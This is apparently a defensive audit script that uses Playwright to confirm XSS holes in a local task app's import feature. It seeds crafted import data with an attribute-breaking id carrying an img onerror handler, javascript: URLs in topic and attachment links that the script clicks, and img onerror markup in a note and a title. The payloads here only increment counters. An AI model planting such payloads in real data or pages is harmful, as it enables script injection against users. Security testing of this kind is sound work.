/**
 * Focused confirmation of the import-trust vulnerabilities found by probe.mjs.
 * An import file is untrusted input (a "starter pack", a colleague's backup,
 * anything a buyer is told to load).
 *
 * Reads are taken AFTER a real delay so async handlers (img onerror, javascript:
 * URL navigation) have time to run — a same-tick read under-reports execution.
 *
 * Run: node tools/audit/confirm-link-xss.mjs http://127.0.0.1:3601/
 */
import { chromium } from "playwright-core";

const EXEC = "/home/Jerry/.cache/ms-playwright/chromium-1254/chrome-linux64/chrome";
const TARGET = process.argv[2] || "http://127.0.0.1:3601/";
const browser = await chromium.launch({
  executablePath: EXEC,
  args: ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu", "--no-zygote",
         "--renderer-process-limit=1", "--js-flags=--max-old-space-size=512"],
});
const ctx = await browser.newContext();
const page = await ctx.newPage();
await page.addInitScript(() => {
  window.__xss = 0;
  window.__fired = [];
  window.alert = (m) => { window.__xss++; window.__fired.push("alert:" + String(m).slice(0, 40)); };
});
page.on("dialog", (d) => d.dismiss().catch(() => {}));
await page.goto(TARGET, { waitUntil: "load" });

const base = {
  format: "taskapp-export", version: 1,
  domains: [{ id: "business", name: "Business" }],
  tasks: [{
    id: "t1", title: "looks harmless", domain_id: "business", status: "todo", priority: "medium",
    recurrence: "none", recurrence_interval: 1, tags: [],
    created_at: "2026-01-01T00:00:00.000Z", updated_at: "2026-01-01T00:00:00.000Z",
  }],
};
const clone = (o) => JSON.parse(JSON.stringify(o));
const results = {};

/* 1 — attribute injection through an unvalidated imported id */
{
  const d = clone(base);
  d.tasks[0].id = `x"><img src="nope.png" onerror="window.__xss++;window.__fired.push('img-onerror')">`;
  const seeded = await page.evaluate((data) => {
    window.__xss = 0; window.__fired = [];
    localStorage.clear(); S = blankState();
    let threw = null, st = null;
    try { st = importData(data); save(); } catch (e) { threw = String(e.message); }
    ui.view = "board"; render();
    return { threw, st, imgsInMain: document.querySelectorAll("#main img").length };
  }, d);
  await page.waitForTimeout(900);
  results.id_attribute_injection = { ...seeded, ...(await page.evaluate(() => ({ xss: window.__xss, fired: window.__fired, imgs: document.querySelectorAll("#main img").length }))) };
}

/* 2 — javascript: URL in an imported topic link, actually clicked */
{
  const d = clone(base);
  d.research = [{ id: "r1", name: "topic", domain_id: "business", status: "explore", level: 0, tags: [],
    body: "", log: [], created_at: "2026-01-01T00:00:00.000Z", updated_at: "2026-01-01T00:00:00.000Z",
    links: [{ id: "l1", url: "javascript:window.__xss+=10;window.__fired.push('topic-link')", label: "click me" }] }];
  const r = await page.evaluate((data) => {
    window.__xss = 0; window.__fired = [];
    localStorage.clear(); S = blankState();
    importData(data); save();
    ui.view = "research"; render(); openTopic("r1", "preview");
    const a = [...document.querySelectorAll("#drawer a")].find((x) => x.textContent.includes("click me"));
    if (!a) return { rendered: false };
    const href = a.getAttribute("href"), target = a.getAttribute("target");
    a.click();
    return { rendered: true, href, target };
  }, d);
  await page.waitForTimeout(500);
  results.topic_link_javascript_url = { ...r, ...(await page.evaluate(() => ({ xss: window.__xss, fired: window.__fired, url: location.href }))) };
}

/* 3 — javascript: URL in an imported attachment link, clicked */
{
  const d = clone(base);
  d.attachments = [{ id: "a1", task_id: "t1", file_name: "invoice.pdf", url: "javascript:window.__xss+=100;window.__fired.push('attachment')",
    mime_type: "text/uri-list", size_bytes: 0, created_at: "2026-01-01T00:00:00.000Z" }];
  const r = await page.evaluate((data) => {
    window.__xss = 0; window.__fired = [];
    localStorage.clear(); S = blankState();
    importData(data); save();
    ui.view = "board"; render(); openTask("t1");
    const a = [...document.querySelectorAll("#drawer a")].find((x) => x.textContent.includes("invoice.pdf"));
    if (!a) return { rendered: false };
    const href = a.getAttribute("href");
    a.click();
    return { rendered: true, href };
  }, d);
  await page.waitForTimeout(500);
  results.attachment_javascript_url = { ...r, ...(await page.evaluate(() => ({ xss: window.__xss, fired: window.__fired, url: location.href }))) };
}

/* 4 — markup in an imported note body and task title (the card's paste question) */
{
  const d = clone(base);
  d.notes = [{ id: "n1", task_id: "t1", project_id: null, body: `<img src=x onerror="window.__xss+=1000">`, created_at: "2026-01-01T00:00:00.000Z", updated_at: "2026-01-01T00:00:00.000Z" }];
  d.tasks[0].title = `<img src=x onerror="window.__xss+=1000">`;
  const r = await page.evaluate((data) => {
    window.__xss = 0; window.__fired = [];
    localStorage.clear(); S = blankState();
    importData(data); save();
    ui.view = "board"; render(); openTask("t1");
    return { imgsInMain: document.querySelectorAll("#main img").length, imgsInDrawer: document.querySelectorAll("#drawer img").length,
             titleText: document.querySelector("#main .card .t")?.textContent,
             noteText: document.querySelector("#drawer .note")?.textContent?.slice(0, 60) };
  }, d);
  await page.waitForTimeout(700);
  results.imported_markup_in_title_and_note = { ...r, ...(await page.evaluate(() => ({ xss: window.__xss, fired: window.__fired }))) };
}

console.log(JSON.stringify(results, null, 2));
await browser.close();
